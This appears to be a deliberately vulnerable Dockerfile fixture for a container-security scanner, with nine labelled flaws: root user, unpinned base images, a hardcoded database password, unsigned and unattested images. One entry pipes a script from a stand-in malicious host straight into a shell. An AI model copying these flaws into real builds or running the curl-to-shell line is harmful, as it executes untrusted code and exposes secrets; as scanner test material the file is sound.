# Vulnerable: DVS-001
FROM python:3.11
USER root

# Vulnerable: DVS-002
FROM node:latest

# Vulnerable: DVS-003
ENV DB_PASSWORD=supersecret

# Vulnerable: DVS-004
# docker build -t app:1.0 .
# no provenance attestation

# Vulnerable: DVS-005
# pip install vulnerable-lib==1.2.0
# syft report ignored

# Vulnerable: DVS-006
RUN wget https://example.com/installer.sh -O /tmp/installer.sh
RUN curl -fsSL https://malicious.example/p.sh | sh

# Vulnerable: DVS-007
# if cve.severity >= "HIGH": fail_build()
# ignores VEX not_affected

# Vulnerable: DVS-008
# docker push registry/app:1.0.0
# no cosign/signature

# Vulnerable: DVS-009
FROM alpine:latest
RUN pip install -r requirements.txt
